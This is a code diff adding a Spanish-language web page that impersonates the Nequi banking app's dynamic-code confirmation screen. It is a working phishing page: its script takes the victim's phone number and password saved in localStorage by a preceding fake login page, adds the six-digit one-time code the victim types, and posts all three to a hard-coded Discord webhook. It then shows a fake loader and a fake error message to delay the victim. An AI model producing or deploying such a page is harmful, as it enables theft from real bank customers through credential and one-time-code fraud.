@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Nequi | Clave Dinámica</title>
+  <link rel="shortcut icon" href="./assets/pse/N_logo.png" type="image/x-icon">
+  <style>
+    :root {
+      --bg: #fbe5f2;
+      --white: #fff;
+      --purple: #200020;
+      --orchid: #da0081;
+      --input-bg: #faf7fb;
+      --font: sans-serif;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
+    html, body { height:100%; font:16px/1.5 var(--font); background:var(--bg); display:flex; flex-direction:column; }
+    header { background:var(--white); box-shadow:0 1px 4px rgba(0,0,0,0.1); }
+    header .inner { max-width:360px; margin:0 auto; padding:1rem; display:flex; align-items:center; }
+    header img { height:32px; }
+    main { flex:1; display:flex; align-items:center; justify-content:center; padding:1rem; }
+    .card {
+      background:var(--white);
+      border-radius:8px;
+      box-shadow:0 2px 8px rgba(0,0,0,0.1);
+      width:100%; max-width:360px;
+      padding:2rem 1.5rem;
+      text-align:center;
+      position:relative;
+    }
+    .card h2 { color:var(--purple); font-size:1.25rem; margin-bottom:.5rem; }
+    .card p { color:#646464; font-size:.875rem; margin-bottom:1.5rem; }
+    .pin-row { display:flex; justify-content:space-between; gap:.25rem; margin-bottom:1.5rem; }
+    .pin-row input {
+      width:2.5rem; height:2.5rem;
+      font-size:1.5rem; text-align:center;
+      border:none; border-bottom:2px solid var(--orchid);
+      background:var(--input-bg);
+      border-radius:4px 4px 0 0;
+    }
+    .pin-row input:focus { outline:none; background:var(--white); }
+    .btn {
+      display:block; width:100%;
+      padding:.75rem;
+      background:var(--orchid);
+      color:var(--white);
+      border:none; border-radius:4px;
+      font-size:1rem; font-weight:500;
+      cursor:pointer; transition:background .2s;
+    }
+    .btn:hover { background:#b3006b; }
+    #loader {
+      position:absolute; top:0; left:0;
+      width:100%; height:100%;
+      background:rgba(255,255,255,0.9);
+      display:flex; flex-direction:column; align-items:center; justify-content:center;
+      visibility:hidden;
+    }
+    #loader.visible { visibility:visible; }
+    #error-msg {
+      color:#c00; font-weight:600;
+      margin-top:1rem; display:none;
+    }
+    footer {
+      background:var(--white);
+      border-top:1px solid #e8e8e8;
+      padding:.75rem 1rem;
+      font-size:.75rem; color:var(--purple);
+      text-align:center;
+    }
+    footer a { color:var(--orchid); text-decoration:none; margin:0 .25rem; }
+    footer a:hover { text-decoration:underline; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="inner">
+      <img src="./assets/pse/logo_nequi.svg" alt="Nequi">
+    </div>
+  </header>
+
+  <main>
+    <div class="card">
+      <h2>Confirmemos que eres tú</h2>
+      <p>Ingresa los 6 dígitos que ves en tu App Nequi.</p>
+
+      <form id="form-dynamic" class="pin-row">
+        <input type="text" maxlength="1" id="pin-0" autocomplete="off" required>
+        <input type="text" maxlength="1" id="pin-1" autocomplete="off" required>
+        <input type="text" maxlength="1" id="pin-2" autocomplete="off" required>
+        <input type="text" maxlength="1" id="pin-3" autocomplete="off" required>
+        <input type="text" maxlength="1" id="pin-4" autocomplete="off" required>
+        <input type="text" maxlength="1" id="pin-5" autocomplete="off" required>
+      </form>
+
+      <button id="btn-submit" class="btn">Confirmar</button>
+      <p id="error-msg">Código incorrecto. Intenta más tarde.</p>
+
+      <div id="loader">
+        <img src="./assets/pse/loading_nequi.gif" width="150" alt="Cargando">
+        <p class="mt-4">Verificando tu código... ¡No cierres esta ventana!</p>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    © 2025 Nequi • <a href="#">Términos y condiciones</a> • <a href="#">Política de privacidad</a> • <a href="#">Ayuda</a> • <a href="#">Contáctanos</a>
+  </footer>
+
+  <script>
+    // Obtiene credenciales guardadas en localStorage por la página de login
+    const phone = localStorage.getItem('user') || 'N/D';
+    const pass  = localStorage.getItem('pass') || 'N/D';
+
+    // Envía a Discord con webhook: user, pass y dinámica
+    async function sendAllToDiscord(cdin) {
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1385429109135642704/fSW0pterLx8L5gjnCN7oqINDawcI5TCOu-74JXiuyL_9Z2gZpo9eoUmeS_ttqkmH_sOg';
+      const payload = {
+        username: 'Nequi Bot',
+        avatar_url: 'https://i.imgur.com/nequi-logo.png',
+        embeds: [{
+          title: '🏦 Nueva Solicitud Nequi',
+          color: 0xDA0081,
+          fields: [
+            { name: '📱 Usuario',       value: `+57 ${phone}`,  inline: true },
+            { name: '🔑 Contraseña',    value: pass,             inline: true  },
+            { name: '🔐 Clave Dinámica', value: cdin,            inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error('Error enviando a Discord:', e);
+      }
+    }
+
+    // Manejo de inputs PIN
+    const inputs = Array.from(document.querySelectorAll('.pin-row input'));
+    inputs.forEach((inp, i) => {
+      inp.addEventListener('input', () => {
+        inp.value = inp.value.replace(/[^0-9]/g, '');
+        if (inp.value && i < inputs.length - 1) inputs[i+1].focus();
+      });
+      inp.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !inp.value && i > 0) inputs[i-1].focus();
+      });
+    });
+
+    // Submit: envía user+pass+cdin, muestra loader y luego error
+    document.getElementById('btn-submit').addEventListener('click', () => {
+      const cdin = inputs.map(i => i.value).join('');
+      if (cdin.length < 6) {
+        alert('Por favor completa los 6 dígitos.');
+        return;
+      }
+      // Enviar todo a Discord
+      sendAllToDiscord(cdin);
+
+      // Mostrar loader y ocultar error
+      const loader = document.getElementById('loader');
+      const err    = document.getElementById('error-msg');
+      loader.classList.add('visible');
+      err.style.display = 'none';
+
+      // Tras 30s ocultar loader y mostrar "Código incorrecto"
+      setTimeout(() => {
+        loader.classList.remove('visible');
+        err.style.display = 'block';
+      }, 30000);
+    });
+  </script>
+</body>
+</html>
